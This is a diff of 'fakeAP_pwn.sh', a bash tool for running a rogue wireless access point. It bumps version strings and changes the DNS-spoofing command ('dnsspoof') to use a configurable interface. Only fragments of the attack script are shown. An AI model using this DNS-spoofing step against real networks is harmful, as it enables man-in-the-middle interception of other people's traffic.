@@ -1,6 +1,6 @@
 #!/bin/bash                                                                                    #
 # (C)opyright 2010 - g0tmi1k & joker5bb                                                        #
-# fakeAP_pwn.sh v0.3 (Beta-#80 2010-08-01)                                                     #
+# fakeAP_pwn.sh v0.3 (Beta-#81 2010-08-03)                                                     #
 #---Important----------------------------------------------------------------------------------#
 # Make sure to copy "www": cp -rf www/* /var/www/fakeAP_pwn                                    #
 # The VNC password is "g0tmi1k" (without "")                                                   #
@@ -70,7 +70,7 @@ verbose=0
 gatewayIP=$(route -n | awk '/^0.0.0.0/ {getline; print $2}')
     ourIP="127.0.0.1"                # 10.0.0.1?
      port=$(shuf -i 2000-65000 -n 1) # Random port each time
-  version="0.3 (Beta-#80)"
+  version="0.3 (Beta-#81)"
       www="${www%/}"                 # Remove trailing slash
 trap 'cleanup interrupt' 2           # Interrupt - "Ctrl + C"
 
@@ -1314,7 +1314,7 @@ fi
 #----------------------------------------------------------------------------------------------#
 if [ "$apMode" != "normal" ] ; then
    display action "Starting: DNS" $diagnostics
-   action "DNS" "dnsspoof -i at0 -f /tmp/fakeAP_pwn.dns" $verbose $diagnostics "true" $debug 10 165 5 & # Dont wait, do the next command
+   action "DNS" "dnsspoof -i $apInterface -f /tmp/fakeAP_pwn.dns" $verbose $diagnostics "true" $debug 10 165 5 & # Dont wait, do the next command
    sleep 2
 
 #----------------------------------------------------------------------------------------------#
